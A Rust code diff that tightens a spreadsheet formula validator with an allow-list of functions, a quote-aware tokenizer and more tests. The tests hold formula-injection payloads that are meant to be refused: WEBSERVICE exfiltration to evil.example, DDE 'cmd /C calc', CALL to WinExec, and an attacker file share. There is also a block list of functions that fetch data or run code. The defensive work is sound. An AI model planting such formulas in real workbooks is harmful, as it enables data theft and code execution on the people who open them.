@@ -416,12 +416,139 @@ fn check_batch(commands: &mut [Value]) -> Result<(), String> {
     Ok(())
 }
 
-/// Functions a workbook's formulas may not name (R50, R53): they fetch from
-/// a server or another file (WEBSERVICE, IMAGE, RTD, FILTERXML over what was
-/// fetched, STOCKHISTORY, TRANSLATE, DETECTLANGUAGE, COPILOT, the IMPORT…
-/// functions), run code (CALL, REGISTER, REGISTER.ID, EXEC, PY), or read a
-/// reference built from text (INDIRECT). Matched as words, which end at a
-/// `.` too, so `_xlfn.IMAGE`, `_xlfn._xlws.PY` and `REGISTER.ID` are refused.
+/// The functions a workbook's formulas may call (R54): maths and rounding,
+/// statistics, logic, text, lookup and reference, date and time, finance,
+/// information and dynamic arrays. None reads outside the workbook or runs
+/// anything; HYPERLINK only links, and only to one quoted address (see
+/// [`hyperlink_addresses`]).
+const FORMULA_ALLOWED: &[&str] = &[
+    "SUM",
+    "SUMIF",
+    "SUMIFS",
+    "SUMPRODUCT",
+    "AVERAGE",
+    "AVERAGEIF",
+    "AVERAGEIFS",
+    "MIN",
+    "MAX",
+    "COUNT",
+    "COUNTA",
+    "COUNTIF",
+    "COUNTIFS",
+    "COUNTBLANK",
+    "IF",
+    "IFS",
+    "IFERROR",
+    "IFNA",
+    "AND",
+    "OR",
+    "NOT",
+    "XOR",
+    "ROUND",
+    "ROUNDUP",
+    "ROUNDDOWN",
+    "INT",
+    "MOD",
+    "ABS",
+    "SQRT",
+    "POWER",
+    "EXP",
+    "LN",
+    "LOG",
+    "LOG10",
+    "RANK",
+    "LARGE",
+    "SMALL",
+    "MEDIAN",
+    "STDEV",
+    "STDEV.P",
+    "STDEV.S",
+    "VAR",
+    "VAR.P",
+    "VAR.S",
+    "PERCENTILE",
+    "QUARTILE",
+    "TEXT",
+    "VALUE",
+    "LEN",
+    "LEFT",
+    "RIGHT",
+    "MID",
+    "TRIM",
+    "UPPER",
+    "LOWER",
+    "PROPER",
+    "CONCAT",
+    "CONCATENATE",
+    "TEXTJOIN",
+    "SUBSTITUTE",
+    "REPLACE",
+    "FIND",
+    "SEARCH",
+    "REPT",
+    "CHAR",
+    "CODE",
+    "VLOOKUP",
+    "HLOOKUP",
+    "XLOOKUP",
+    "INDEX",
+    "MATCH",
+    "XMATCH",
+    "CHOOSE",
+    "ROW",
+    "ROWS",
+    "COLUMN",
+    "COLUMNS",
+    "OFFSET",
+    "DATE",
+    "TODAY",
+    "NOW",
+    "YEAR",
+    "MONTH",
+    "DAY",
+    "HOUR",
+    "MINUTE",
+    "SECOND",
+    "WEEKDAY",
+    "EOMONTH",
+    "EDATE",
+    "DATEDIF",
+    "NETWORKDAYS",
+    "WORKDAY",
+    "DAYS",
+    "PMT",
+    "PV",
+    "FV",
+    "NPV",
+    "IRR",
+    "RATE",
+    "NPER",
+    "ISBLANK",
+    "ISNUMBER",
+    "ISTEXT",
+    "ISERROR",
+    "N",
+    "T",
+    "UNIQUE",
+    "SORT",
+    "SORTBY",
+    "FILTER",
+    "SEQUENCE",
+    "TRUE",
+    "FALSE",
+    "PI",
+    "HYPERLINK",
+];
+/// The prefixes Excel stores newer functions under (`_xlfn.XLOOKUP`,
+/// `_xlfn._xlws.SORT`).
+const FUNCTION_PREFIXES: &[&str] = &["_XLFN.", "_XLWS."];
+/// A second check (R50, R53): words a formula may not hold anywhere, quoted
+/// text included, because they fetch from a server or another file
+/// (WEBSERVICE, IMAGE, RTD, FILTERXML over what was fetched, STOCKHISTORY,
+/// TRANSLATE, DETECTLANGUAGE, COPILOT, the IMPORT… functions), run code or
+/// another program (CALL, REGISTER, REGISTER.ID, EXEC, PY, DDE), or read a
+/// reference built from text (INDIRECT). Words end at a `.` too, so
+/// `_xlfn.IMAGE` and `REGISTER.ID` are among them.
 const FORMULA_FUNCTIONS: &[&str] = &[
     "WEBSERVICE",
     "IMAGE",
@@ -442,6 +569,7 @@ const FORMULA_FUNCTIONS: &[&str] = &[
     "IMPORTHTML",
     "PY",
     "INDIRECT",
+    "DDE",
 ];
 /// Families refused by their names' start: CUBEVALUE, CUBEMEMBER, CUBESET…
 /// read an OLAP server.
@@ -478,7 +606,8 @@ const FORMULA_TARGETS: &[&str] = &[
     "sparkline",
     "table",
 ];
-/// What starts a formula: Excel reads a leading `+`, `-` or `@` as `=`.
+/// What starts a formula: Excel reads a leading `+`, `-` or `@` as `=`
+/// (a value that is a number is none).
 const FORMULA_STARTS: &[char] = &['=', '+', '-', '@'];
 /// What a workbook file is named: a name before `!` that ends so refers to
 /// another workbook.
@@ -486,14 +615,14 @@ const WORKBOOK_EXTENSIONS: &[&str] = &[
     ".xls", ".xlsx", ".xlsm", ".xlsb", ".xla", ".xlam", ".xlt", ".xltx", ".xltm", ".ods", ".csv",
 ];
 
-/// The formulas of an xlsx batch (R50, R53). A property is read as a
-/// formula when it may be one: a [`FORMULA_KEYS`] key, any value of an item
-/// on a [`FORMULA_TARGETS`] element, any value that starts like a formula
-/// (a row takes its table's column names as keys). A formula names no
-/// [`FORMULA_FUNCTIONS`], has no DDE link, no other workbook, and no file
-/// share or address outside HYPERLINK's quoted link. A table's inline rows
-/// hold values only. Excel evaluates what passes: formulas are filtered,
-/// not sandboxed.
+/// The formulas of an xlsx batch (R50, R53, R54). Any value that starts
+/// like a formula is one, whatever its key or element; so is any value of a
+/// [`FORMULA_KEYS`] key or of an item on a [`FORMULA_TARGETS`] element. A
+/// formula calls only [`FORMULA_ALLOWED`] functions, holds none of
+/// [`FORMULA_FUNCTIONS`], no DDE link, no other workbook, and no file share
+/// or address outside HYPERLINK's quoted link. A table's inline rows hold
+/// values only. Excel evaluates what passes: formulas are filtered, not
+/// sandboxed.
 fn check_formulas(commands: &[Value]) -> Result<(), String> {
     for (index, item) in commands.iter().enumerate() {
         let Some(fields) = item.as_object() else {
@@ -509,16 +638,15 @@ fn check_formulas(commands: &[Value]) -> Result<(), String> {
             };
             let lower = key.to_ascii_lowercase();
             let last = lower.rsplit('.').next().unwrap_or(&lower);
-            let why = if lower == "data" {
-                refused_data_cells(text)
-            } else if targeted
-                || FORMULA_KEYS.contains(&last)
-                || text.trim().starts_with(FORMULA_STARTS)
-            {
-                refused_formula(text)
-            } else {
-                None
-            };
+            // A table's rows as a whole only when they start like one: they
+            // may hold addresses and any word.
+            let data = lower == "data";
+            let formula = starts_like_a_formula(text)
+                || (!data && (targeted || FORMULA_KEYS.contains(&last)));
+            let why = formula
+                .then(|| refused_formula(text))
+                .flatten()
+                .or_else(|| data.then(|| refused_data_cells(text)).flatten());
             if let Some(why) = why {
                 return Err(refuse(
                     FAILED,
@@ -530,9 +658,17 @@ fn check_formulas(commands: &[Value]) -> Result<(), String> {
     Ok(())
 }
 
+/// Whether Excel would read `text` as a formula: after any leading
+/// whitespace it starts with one of [`FORMULA_STARTS`], and it is not a
+/// number (`-3.5`).
+fn starts_like_a_formula(text: &str) -> bool {
+    text.trim_start().starts_with(FORMULA_STARTS) && text.trim().parse::<f64>().is_err()
+}
+
 /// Whether an item's values may be formulas without `=`: its `type`, or a
 /// segment of a path it names (past the sheet's name, when there are
-/// several), is one of [`FORMULA_TARGETS`].
+/// several), is one of [`FORMULA_TARGETS`]. A path is read as officecli
+/// takes one: `/Sheet1/cf[1]` and `Sheet1!cf[1]` alike.
 fn holds_formulas(fields: &Map<String, Value>) -> bool {
     let target = |name: &str| {
         let name: String = name
@@ -548,7 +684,7 @@ fn holds_formulas(fields: &Map<String, Value>) -> bool {
         .any(|path| {
             let segments: Vec<&str> = path
                 .trim_start_matches('/')
-                .split('/')
+                .split(['/', '!'])
                 .map(|segment| segment.split('[').next().unwrap_or_default())
                 .collect();
             let sheet = usize::from(segments.len() > 1);
@@ -562,22 +698,32 @@ fn holds_formulas(fields: &Map<String, Value>) -> bool {
 }
 
 /// Why a table's inline rows are refused, if they are: a cell (split at
-/// `,`, `;` and line breaks) that starts like a formula and is not a
-/// number. Table data holds values; a formula goes in its cell's `formula`.
+/// `,`, `;`, tabs and line breaks) that starts like a formula. Table data
+/// holds values; a formula goes in its cell's `formula`.
 fn refused_data_cells(text: &str) -> Option<String> {
-    text.split([',', ';', '\n', '\r'])
-        .map(|cell| cell.trim().trim_matches('"').trim())
-        .any(|cell| cell.starts_with(FORMULA_STARTS) && cell.parse::<f64>().is_err())
+    text.split([',', ';', '\t', '\n', '\r'])
+        .any(|cell| starts_like_a_formula(cell.trim().trim_matches('"')))
         .then(|| {
             "has a cell that starts with =, +, - or @ and is not a number; table rows hold values only: set a formula with \"formula\" on its cell"
                 .into()
         })
 }
 
-/// Why a formula is refused, if it is. Each check reads the whole text,
-/// quoted strings included: a lexer that disagreed with Excel's about where
-/// a string ends could hide a call.
+/// Why a formula is refused, if it is: a call of a function that is not
+/// [`FORMULA_ALLOWED`] first, then checks that read the whole text, quoted
+/// strings included.
 fn refused_formula(text: &str) -> Option<String> {
+    let code = match formula_code(text) {
+        Ok(code) => code,
+        Err(why) => return Some(why.into()),
+    };
+    if let Some(name) =
+        called_functions(&code).find(|name| !FORMULA_ALLOWED.contains(&name.as_str()))
+    {
+        return Some(format!(
+            "calls {name}, which a workbook made here cannot use: formulas may call maths, statistics, logic, text, lookup, date, finance and information functions (SUM, IF, IFERROR, VLOOKUP, XLOOKUP, TEXT, DATE, PMT, ISNUMBER…), and HYPERLINK with one quoted https:, http:, mailto: or # address"
+        ));
+    }
     let words = || {
         text.split(|c: char| !(c.is_ascii_alphanumeric() || c == '_'))
             .filter(|word| !word.is_empty())
@@ -591,7 +737,7 @@ fn refused_formula(text: &str) -> Option<String> {
     };
     if let Some(name) = words().find(refused) {
         return Some(format!(
-            "names {name}: a formula cannot use a function that fetches, runs code or builds a reference from text (WEBSERVICE, IMAGE, INDIRECT, STOCKHISTORY, CUBE…, IMPORT…, PY and others), even in quoted text"
+            "names {name}: a formula cannot hold a function that fetches, runs code or builds a reference from text (WEBSERVICE, IMAGE, INDIRECT, DDE, STOCKHISTORY, CUBE…, IMPORT…, PY and others), even in quoted text"
         ));
     }
     if text.contains('|') {
@@ -630,6 +776,106 @@ fn refused_formula(text: &str) -> Option<String> {
         );
     }
     None
+}
+
+/// `text` as Excel reads its code: each quoted string, quoted sheet name
+/// and bracketed table reference kept as its delimiters only (`""`, `''`,
+/// `[]`), so that no word inside one reads as a call. Refused when one does
+/// not pair up, or when a sheet name or a table reference holds a `"`:
+/// where a string starts would then be in doubt.
+fn formula_code(text: &str) -> Result<String, &'static str> {
+    #[derive(Clone, Copy)]
+    enum State {
+        Code,
+        Text,
+        Name,
+        Bracket(usize),
+    }
+    const UNPAIRED: &str = "has a quote or a bracket that does not pair up";
+    const QUOTED: &str =
+        "has a \" inside a sheet name or a table reference; a formula cannot hold one there";
+    let mut code = String::with_capacity(text.len());
+    let mut chars = text.chars().peekable();
+    let mut state = State::Code;
+    while let Some(c) = chars.next() {
+        state = match (state, c) {
+            (State::Code, '"') => {
+                code.push('"');
+                State::Text
+            }
+            (State::Code, '\'') => {
+                code.push('\'');
+                State::Name
+            }
+            (State::Code, '[') => {
+                code.push('[');
+                State::Bracket(1)
+            }
+            (State::Code, ']') => return Err(UNPAIRED),
+            (State::Code, c) => {
+                code.push(c);
+                State::Code
+            }
+            (State::Text, '"') if chars.peek() == Some(&'"') => {
+                chars.next();
+                State::Text
+            }
+            (State::Text, '"') => {
+                code.push('"');
+                State::Code
+            }
+            (State::Text, _) => State::Text,
+            (State::Name, '\'') if chars.peek() == Some(&'\'') => {
+                chars.next();
+                State::Name
+            }
+            (State::Name, '\'') => {
+                code.push('\'');
+                State::Code
+            }
+            (State::Name | State::Bracket(_), '"') => return Err(QUOTED),
+            (State::Name, _) => State::Name,
+            // `'` escapes the next character of a table reference.
+            (State::Bracket(depth), '\'') => match chars.next() {
+                Some('"') => return Err(QUOTED),
+                _ => State::Bracket(depth),
+            },
+            (State::Bracket(depth), '[') => State::Bracket(depth + 1),
+            (State::Bracket(1), ']') => {
+                code.push(']');
+                State::Code
+            }
+            (State::Bracket(depth), ']') => State::Bracket(depth - 1),
+            (State::Bracket(depth), _) => State::Bracket(depth),
+        };
+    }
+    match state {
+        State::Code => Ok(code),
+        _ => Err(UNPAIRED),
+    }
+}
+
+/// The names `code` (see [`formula_code`]) calls: each word before a `(`,
+/// in upper case and without [`FUNCTION_PREFIXES`].
+fn called_functions(code: &str) -> impl Iterator<Item = String> + '_ {
+    let name = |c: char| c.is_alphanumeric() || matches!(c, '_' | '.' | '\\' | '?');
+    code.match_indices('(').filter_map(move |(at, _)| {
+        let before = code[..at].trim_end();
+        let start = before
+            .char_indices()
+            .rev()
+            .take_while(|&(_, c)| name(c))
+            .last()
+            .map(|(start, _)| start)?;
+        let mut word = before[start..].to_uppercase();
+        while let Some(prefix) = FUNCTION_PREFIXES
+            .iter()
+            .find(|prefix| word.starts_with(*prefix))
+        {
+            word = word[prefix.len()..].to_owned();
+        }
+        Some(word)
+    })
 }
 
 /// Whether a reference before a `!` names another workbook: a quoted name
@@ -3491,30 +3737,24 @@ esac"#,
         for (props, why) in [
             (
                 json!({"formula": r#"WEBSERVICE("https://evil.example/?"&B2)"#}),
-                "names WEBSERVICE",
+                "WEBSERVICE",
             ),
-            (json!({"formula": "webservice(B2)"}), "names WEBSERVICE"),
-            (json!({"formula": "_xlfn.IMAGE(B2)"}), "names IMAGE"),
-            (json!({"formula": r#"RTD("x",,"y")"#}), "names RTD"),
+            (json!({"formula": "webservice(B2)"}), "WEBSERVICE"),
+            (json!({"formula": "_xlfn.IMAGE(B2)"}), "IMAGE"),
+            (json!({"formula": r#"RTD("x",,"y")"#}), "RTD"),
             (
                 json!({"formula": r#"CALL("kernel32","WinExec","JCJ","calc",0)"#}),
-                "names CALL",
+                "CALL",
             ),
-            (json!({"formula": r#"REGISTER("x","y")"#}), "names REGISTER"),
-            (
-                json!({"formula": r#"REGISTER.ID("x","y")"#}),
-                "names REGISTER",
-            ),
-            (json!({"formula": r#"EXEC("calc")"#}), "names EXEC"),
-            (
-                json!({"formula": r#"FILTERXML(B2,"//a")"#}),
-                "names FILTERXML",
-            ),
+            (json!({"formula": r#"REGISTER("x","y")"#}), "REGISTER"),
+            (json!({"formula": r#"REGISTER.ID("x","y")"#}), "REGISTER"),
+            (json!({"formula": r#"EXEC("calc")"#}), "EXEC"),
+            (json!({"formula": r#"FILTERXML(B2,"//a")"#}), "FILTERXML"),
             // A value that starts with `=` is a formula, under any key (a
             // row takes its table's column names as keys).
-            (json!({"value": "=WEBSERVICE(B2)"}), "names WEBSERVICE"),
-            (json!({"value": " =IMAGE(B2)"}), "names IMAGE"),
-            (json!({"Salary": r#"=RTD("x",,"y")"#}), "names RTD"),
+            (json!({"value": "=WEBSERVICE(B2)"}), "WEBSERVICE"),
+            (json!({"value": " =IMAGE(B2)"}), "IMAGE"),
+            (json!({"Salary": r#"=RTD("x",,"y")"#}), "RTD"),
             // DDE.
             (json!({"formula": "cmd|' /C calc'!A0"}), "(DDE)"),
             (json!({"value": "=cmd|' /C calc'!A0"}), "(DDE)"),
@@ -3540,7 +3780,7 @@ esac"#,
             // File shares and addresses, but in HYPERLINK's link.
             (
                 json!({"formula": r#"INDIRECT("\\attacker\share")"#}),
-                "names INDIRECT",
+                "INDIRECT",
             ),
             (
                 json!({"formula": r#"CONCAT("https://evil.example/",B2)"#}),
@@ -3565,56 +3805,44 @@ esac"#,
             // R53: more functions, under any prefix.
             (
                 json!({"formula": r#"_xlfn.WEBSERVICE("https://evil.example/")"#}),
-                "names WEBSERVICE",
+                "WEBSERVICE",
             ),
             (
                 json!({"value": r#"=STOCKHISTORY("MSFT",TODAY())"#}),
-                "names STOCKHISTORY",
+                "STOCKHISTORY",
             ),
             (
                 json!({"formula": r#"CUBEVALUE("Sales","[Measures].[x]")"#}),
-                "names CUBEVALUE",
+                "CUBEVALUE",
             ),
             (
                 json!({"formula": r#"_xlfn.CUBEMEMBER("Sales","x")"#}),
-                "names CUBEMEMBER",
+                "CUBEMEMBER",
             ),
             (
                 json!({"formula": r#"TRANSLATE(B2,"en","fr")"#}),
-                "names TRANSLATE",
+                "TRANSLATE",
             ),
-            (
-                json!({"formula": "DETECTLANGUAGE(B2)"}),
-                "names DETECTLANGUAGE",
-            ),
+            (json!({"formula": "DETECTLANGUAGE(B2)"}), "DETECTLANGUAGE"),
             (
                 json!({"formula": r#"COPILOT("summarize",B2:B9)"#}),
-                "names COPILOT",
+                "COPILOT",
             ),
-            (json!({"formula": "IMPORTTEXT(B2)"}), "names IMPORTTEXT"),
-            (json!({"formula": "IMPORTCSV(B2)"}), "names IMPORTCSV"),
-            (json!({"formula": "IMPORTDATA(B2)"}), "names IMPORTDATA"),
-            (
-                json!({"formula": r#"IMPORTRANGE(B2,"A1")"#}),
-                "names IMPORTRANGE",
-            ),
-            (
-                json!({"formula": r#"IMPORTXML(B2,"//a")"#}),
-                "names IMPORTXML",
-            ),
+            (json!({"formula": "IMPORTTEXT(B2)"}), "IMPORTTEXT"),
+            (json!({"formula": "IMPORTCSV(B2)"}), "IMPORTCSV"),
+            (json!({"formula": "IMPORTDATA(B2)"}), "IMPORTDATA"),
+            (json!({"formula": r#"IMPORTRANGE(B2,"A1")"#}), "IMPORTRANGE"),
+            (json!({"formula": r#"IMPORTXML(B2,"//a")"#}), "IMPORTXML"),
             (
                 json!({"formula": r#"IMPORTHTML(B2,"table",1)"#}),
-                "names IMPORTHTML",
+                "IMPORTHTML",
             ),
-            (json!({"formula": r#"_xlfn._xlws.PY("x",0)"#}), "names PY"),
-            (
-                json!({"formula": r#"INDIRECT("Sheet1!"&B2)"#}),
-                "names INDIRECT",
-            ),
+            (json!({"formula": r#"_xlfn._xlws.PY("x",0)"#}), "PY"),
+            (json!({"formula": r#"INDIRECT("Sheet1!"&B2)"#}), "INDIRECT"),
             // R53: `+`, `-` and `@` start a formula too.
-            (json!({"value": "+WEBSERVICE(B2)"}), "names WEBSERVICE"),
-            (json!({"value": "-IMAGE(B2)"}), "names IMAGE"),
-            (json!({"value": "@RTD(B2)"}), "names RTD"),
+            (json!({"value": "+WEBSERVICE(B2)"}), "WEBSERVICE"),
+            (json!({"value": "-IMAGE(B2)"}), "IMAGE"),
+            (json!({"value": "@RTD(B2)"}), "RTD"),
             (json!({"text": "-cmd|' /C calc'!A0"}), "(DDE)"),
             // R53: HYPERLINK's link is one quoted address, nothing built.
             (
@@ -3633,12 +3861,36 @@ esac"#,
                 json!({"formula": r#"HYPERLINK(CHAR(104)&"ttps://x","x")"#}),
                 "uses HYPERLINK",
             ),
-            (json!({"formula": "MAP(A1:A3,HYPERLINK)"}), "uses HYPERLINK"),
+            (json!({"formula": "MAP(A1:A3,HYPERLINK)"}), "calls MAP"),
             (
                 json!({"formula": r#"CONCAT("//attacker/share",B2)"#}),
                 "file share or an address",
             ),
             (json!({"formula": r#"LEN("FILE:x")"#}), "file: address"),
+            // R54: only allowed functions, whatever else they are called.
+            (
+                json!({"value": r#"=DDE("cmd","/c calc","x")"#}),
+                "calls DDE",
+            ),
+            (json!({"formula": r#"EVALUATE("1+1")"#}), "calls EVALUATE"),
+            (json!({"formula": "LAMBDA(x,x)(1)"}), "calls LAMBDA"),
+            (json!({"formula": "_xlfn.LET(x,1,x)"}), "calls LET"),
+            (json!({"formula": "myfn(B2)"}), "calls MYFN"),
+            (
+                json!({"formula": "SUM (A1:A3)+GETPIVOTDATA (B2)"}),
+                "calls GETPIVOTDATA",
+            ),
+            // R54: where a string starts is never in doubt.
+            (
+                json!({"formula": r#"SUM(Table1[[a"b]])&EVALUATE(A2)&Table1[[c"d]]"#}),
+                "inside a sheet name or a table reference",
+            ),
+            (
+                json!({"formula": r#"'x"'!A1&EVALUATE(A2)"#}),
+                "inside a sheet name or a table reference",
+            ),
+            (json!({"formula": r#"LEN("x)"#}), "does not pair up"),
+            (json!({"formula": "SUM(A1)]"}), "does not pair up"),
         ] {
             let error = workbook(&[cell(props.clone())]).unwrap_err();
             assert_eq!(code(&error), FAILED, "{props}");
@@ -3655,19 +3907,19 @@ esac"#,
         for (item, why) in [
             (
                 json!({"command": "add", "parent": "/Sheet1", "type": "cellis", "props": {"ref": "A1:A10", "operator": "greaterThan", "value": "WEBSERVICE(B2)", "fill": "FFFF00"}}),
-                "names WEBSERVICE",
+                "WEBSERVICE",
             ),
             (
                 json!({"command": "add", "parent": "/Sheet1", "type": "formulacf", "props": {"ref": "A1:A10", "formula": "IMAGE(B2)", "fill": "FFFF00"}}),
-                "names IMAGE",
+                "IMAGE",
             ),
             (
                 json!({"command": "add", "parent": "/Sheet1", "type": "validation", "props": {"ref": "A1", "type": "custom", "formula1": "RTD(\"x\",,\"y\")"}}),
-                "names RTD",
+                "RTD",
             ),
             (
                 json!({"command": "add", "parent": "/Sheet1", "type": "namedrange", "props": {"name": "feed", "ref": "WEBSERVICE(Sheet1!B2)"}}),
-                "names WEBSERVICE",
+                "WEBSERVICE",
             ),
             (
                 json!({"command": "add", "parent": "/Sheet1", "type": "namedrange", "props": {"name": "feed", "refersTo": "[x.xlsx]Sheet1!A1"}}),
@@ -3677,31 +3929,31 @@ esac"#,
             // checks take `/Sheet1/cf[1]` only as a selector, `cf[1]`).
             (
                 json!({"command": "set", "path": "cf[1]", "props": {"formula": "=WEBSERVICE(B2)"}}),
-                "names WEBSERVICE",
+                "WEBSERVICE",
             ),
             (
                 json!({"command": "set", "path": "cf[1]", "props": {"value": "WEBSERVICE(B2)"}}),
-                "names WEBSERVICE",
+                "WEBSERVICE",
             ),
             (
                 json!({"command": "set", "path": "data-validation[1]", "props": {"formula1": "IMAGE(B2)"}}),
-                "names IMAGE",
+                "IMAGE",
             ),
             (
                 json!({"command": "set", "selector": "Conditional_Formatting[2]", "props": {"value2": "RTD(B2)"}}),
-                "names RTD",
+                "RTD",
             ),
             (
                 json!({"command": "add", "parent": "/Sheet1/chart[1]", "type": "series", "props": {"values": "WEBSERVICE(B2)"}}),
-                "names WEBSERVICE",
+                "WEBSERVICE",
             ),
             (
                 json!({"command": "add", "parent": "/Sheet1", "type": "Chart-Series", "props": {"name": "INDIRECT(B2)"}}),
-                "names INDIRECT",
+                "INDIRECT",
             ),
             (
                 json!({"command": "set", "path": "sparkline[1]", "props": {"range": "INDIRECT(B2)"}}),
-                "names INDIRECT",
+                "INDIRECT",
             ),
             // R53: a table's rows hold values.
             (
@@ -3719,6 +3971,27 @@ esac"#,
             (
                 json!({"command": "set", "path": "/Sheet1/A1", "props": {"data": "-x"}}),
                 "table rows hold values only",
+            ),
+            // R54: the selector form of a path, and tab-separated rows.
+            (
+                json!({"command": "set", "selector": "Sheet1!cf[1]", "props": {"formula": "=WEBSERVICE(B2)"}}),
+                "WEBSERVICE",
+            ),
+            (
+                json!({"command": "set", "path": "Sheet1!cf[1]", "props": {"value": "WEBSERVICE(B2)"}}),
+                "WEBSERVICE",
+            ),
+            (
+                json!({"command": "set", "path": "Sheet1!validation[1]", "props": {"value2": "EVALUATE(B2)"}}),
+                "calls EVALUATE",
+            ),
+            (
+                json!({"command": "add", "parent": "/Sheet1", "type": "table", "props": {"ref": "A1:B2", "data": "Name\tValue\nA\t=WEBSERVICE(B2)"}}),
+                "table rows hold values only",
+            ),
+            (
+                json!({"command": "add", "parent": "/Sheet1", "type": "table", "props": {"ref": "A1:B2", "data": "=EVALUATE(B2),2"}}),
+                "calls EVALUATE",
             ),
         ] {
             let error = workbook(std::slice::from_ref(&item)).unwrap_err();
@@ -3757,6 +4030,17 @@ esac"#,
             workbook(&[cell(props.clone())]).unwrap_or_else(|error| panic!("{props}: {error}"));
         }
         for props in [
+            json!({"value": "=_xlfn.XLOOKUP(A2,B:B,C:C)"}),
+            json!({"value": "=_xlfn._xlws.SORT(A2:A9)"}),
+            json!({"formula": "STDEV.S(B2:B9)/AVERAGE(B2:B9)"}),
+            json!({"formula": r#"IF(B2>0,"Growth (YoY)","")"#}),
+            json!({"formula": "SUMPRODUCT(B2:B4,C2:C4)"}),
+            json!({"formula": "VLOOKUP(A2,'Price List'!A:B,2,FALSE)"}),
+            json!({"formula": "SUM(Table1[[#Data],[Sales]])"}),
+            json!({"formula": r#"INDEX(Table1[Sales],MATCH("x",Table1[Name],0))"#}),
+            json!({"formula": "SUM(Table1['#Count])"}),
+            json!({"formula": "ROUND(PMT(B2/12,B3,-B4),2)"}),
+            json!({"value": "=TODAY()-DATE(2026,1,1)"}),
             json!({"value": "-3.5"}),
             json!({"value": "+5"}),
             json!({"value": "-B2"}),
